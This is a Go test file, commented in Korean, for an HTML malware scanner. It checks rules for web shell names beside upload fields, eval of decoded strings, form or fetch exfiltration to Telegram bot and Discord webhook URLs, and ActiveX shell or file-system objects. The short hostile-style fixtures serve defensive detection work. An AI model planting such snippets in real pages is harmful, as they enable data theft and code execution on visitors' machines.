package scanner

import "testing"

func TestWebShellSignature(t *testing.T) {
	const code = "webshell-signature"
	cases := []struct {
		name, html string
		want       int
	}{
		// 음성 — 이름만 보이면 웹셸을 다루는 글
		{"본문에이름만", `<p>c99shell</p>`, 0},
		{"제목에이름만", `<title>c99shell</title>`, 0},
		{"업로드칸만", `<form><input type=file></form>`, 0},
		{"텍스트입력칸", `<p>c99shell</p><input type=text>`, 0},
		{"업로드칸이글자", `<p>c99shell</p><textarea><input type=file></textarea>`, 0},
		// 스크립트·스타일·속성·주석 안의 이름 -> URL·메타데이터였음 (C-TAS 실측)
		{"스크립트안이름", `<script>var m = "c99shell";</script><input type=file>`, 0},
		{"스타일안이름", `<style>c99shell</style><input type=file>`, 0},
		{"속성안이름", `<a href="/c99shell.php">x</a><input type=file>`, 0},
		{"주석안이름", `<!-- c99shell --><input type=file>`, 0},
		// 양성 — 이름 ∧ 업로드 칸 -> 웹셸 화면 그 자체
		{"제목+업로드", `<title>c99shell v. 1.0</title><form><input type=file name=f></form>`, 1},
		{"본문+업로드", `<b>c99shell</b><input type=file>`, 1},
		{"업로드가먼저", `<input type=file><p>c99shell</p>`, 1},
		{"대소문자", `<p>C99Shell</p><input TYPE=FILE>`, 1},
		{"다른시그니처", `<title>ByroeNet SheLL</title><input type=file>`, 1},
		{"이름둘은한건", `<title>c99shell</title><p>r57shell</p><input type=file><input type=file>`, 1},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, "", code); got != c.want {
				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

func TestObfuscatedEval(t *testing.T) {
	const code = "obfuscated-eval"
	cases := []struct {
		name, html string
		want       int
	}{
		{"eval단독", `<script>eval(x)</script>`, 0},
		{"atob단독", `<script>atob(x)</script>`, 0},
		{"eval과atob", `<script>eval(atob(x))</script>`, 1},
		{"eval과unescape", `<script>eval(unescape(x))</script>`, 1},
		{"대문자", `<script>EVAL(ATOB(x))</script>`, 1},
		{"fromCharCode", `<script>eval(String.fromCharCode(97))</script>`, 1},
		{"스타일은아님", `<style>eval(atob(x))</style>`, 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, "", code); got != c.want {
				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

func TestExfilChannel(t *testing.T) {
	const page = "https://a.com/"
	const code = "exfil-channel"
	cases := []struct {
		name, html string
		want       int
	}{
		{"스크립트에서전송", `<script>fetch("https://api.telegram.org/bot1/x")</script>`, 1},
		{"폼액션", `<form action="https://api.telegram.org/bot1/x"></form>`, 1},
		{"디스코드", `<script>fetch("https://discord.com/api/webhooks/1")</script>`, 1},
		{"정상폼", `<form action="/login"></form>`, 0},
		{"중첩폼무시", `<form action="/login"><form action="https://api.telegram.org/bot1/x"></form></form>`, 0},
		{"앞폼닫힌뒤", `<form action="/login"></form><form action="https://api.telegram.org/bot1/x"></form>`, 1},
		{"버튼formaction", `<form action="/login"><button formaction="https://api.telegram.org/bot1/x">x</button></form>`, 1},
		{"폼밖버튼", `<button formaction="https://api.telegram.org/bot1/x">x</button>`, 0},

		{"정상스크립트", `<script>fetch("/api/data")</script>`, 0},
		{"본문텍스트는아님", `<p>api.telegram.org</p>`, 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, page, code); got != c.want {
				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

// 발견 위치는 보이는 이름을 가리킴
func TestSignatureOffset(t *testing.T) {
	const html = "<title>관리</title>\n<p>  c99shell</p><input type=file>"
	f, ok := findFirst(html, "", "webshell-signature")
	if !ok {
		t.Fatal("발견되지 않음")
	}
	if f.Line != 2 {
		t.Errorf("Line = %d, want 2", f.Line)
	}
	if f.Col != 6 {
		t.Errorf("Col = %d, want 6", f.Col)
	}
}

// eval 에 디코더를 먹이는 구조를 봄
func TestObfucatedEvalArgument(t *testing.T) {
	const code = "obfuscated-eval"
	cases := []struct {
		name, html string
		want       int
	}{
		// 인자에 디코더가 들어간다
		{"직접", `<script>eval(atob(x))</script>`, 1},
		{"공백", `<script>eval( atob(x) )</script>`, 1},
		{"객체 경유", `<script>eval(window.atob(x))</script>`, 1},
		{"중첩", `<script>eval(decodeURIComponent(escape(s)))</script>`, 1},
		{"앞선 호출 뒤에 디코더", `<script>eval(g() + atob(x))</script>`, 1}, // 첫 ) 에서 멈추면 놓친다
		// 같은 스크립트에 있을 뿐 — 실전에서 만난 오탐
		{"정규식 생성 + 별개 디코더", `<script>eval("/"+n+"=([^;]+)/").exec(document.cookie);var y=atob(z)</script>`, 0},
		{"webpack require + 별개 디코더", `<script>eval("require")(path.join(d,f));var q=atob(p)</script>`, 0},
		// 우리가 못 잡는 것 — 변수로 한 번 거치면 놓친다
		{"변수 경유는 놓친다", `<script>var d=atob(x);eval(d)</script>`, 0},
		// 단독
		{"eval 만", `<script>eval(x)</script>`, 0},
		{"디코더만", `<script>var y=atob(x)</script>`, 0},
		{"괄호가 닫히지 않으면 판정하지 않는다", `<script>eval(atob(x</script>`, 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, "", code); got != c.want {
				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

func TestLocalSystemObject(t *testing.T) {
	const code = "local-system-object"
	cases := []struct {
		name, html string
		want       int
	}{
		// 음성
		{"AJAX용ActiveX", `<script>var x = new ActiveXObject("Microsoft.XMLHTTP");</script>`, 0},
		{"본문글자", `<script>var a = 1;</script><p>Set sh = CreateObject("WScript.Shell")</p>`, 0},
		{"주석", `<script>var a = 1;</script><!-- WScript.Shell -->`, 0},
		{"스타일", `<script>var a = 1;</script><style>/* WScript.Shell */</style>`, 0},
		// 데이터 블록은 실행 안 됨 -> GitHub 코드 화면이 파일 내용을 여기 담음
		{"JSON블록", `<script type="application/json">{"code":"CreateObject(\"WScript.Shell\")"}</script>`, 0},
		{"템플릿블록", `<script type="text/template">new ActiveXObject("Scripting.FileSystemObject")</script>`, 0},
		{"코드블록뒤JSON", `<script>var a = 1;</script><script type="application/json">{"x":"WScript.Shell"}</script>`, 0},
		// 양성 — 방문자 PC 에 파일을 쓰거나 프로그램을 실행
		{"VBScript드로퍼", `<script language="VBScript">Set sh = CreateObject("WScript.Shell")</script>`, 1},
		{"FSO", `<script>var fso = new ActiveXObject("Scripting.FileSystemObject");</script>`, 1},
		{"다운로더", `<script type="text/javascript">var s = new ActiveXObject("ADODB.Stream");</script>`, 1},
		{"ShellApplication", `<script>new ActiveXObject("Shell.Application").ShellExecute("x")</script>`, 1},
		{"type=vbscript", `<script type="text/vbscript">CreateObject("WScript.Shell")</script>`, 1},
		{"대소문자", `<SCRIPT TYPE="Text/JavaScript">new ActiveXObject("wscript.SHELL")</SCRIPT>`, 1},
		{"JSON뒤코드블록", `<script type="application/json">{}</script><script>CreateObject("WScript.Shell")</script>`, 1},
		{"둘이어도한건", `<script>CreateObject("Scripting.FileSystemObject")</script><script>CreateObject("WScript.Shell")</script>`, 1},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, "", code); got != c.want {
				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

// 발견 위치는 객체 이름을 가리킴
func TestLocalSystemObjectOffset(t *testing.T) {
	const html = "<script>\n  CreateObject(\"WScript.Shell\")\n</script>"
	f, ok := findFirst(html, "", "local-system-object")
	if !ok {
		t.Fatal("발견되지 않음")
	}
	if f.Line != 2 {
		t.Errorf("Line = %d, want 2", f.Line)
	}
	if f.Col != 17 {
		t.Errorf("Col = %d, want 17", f.Col)
	}
}
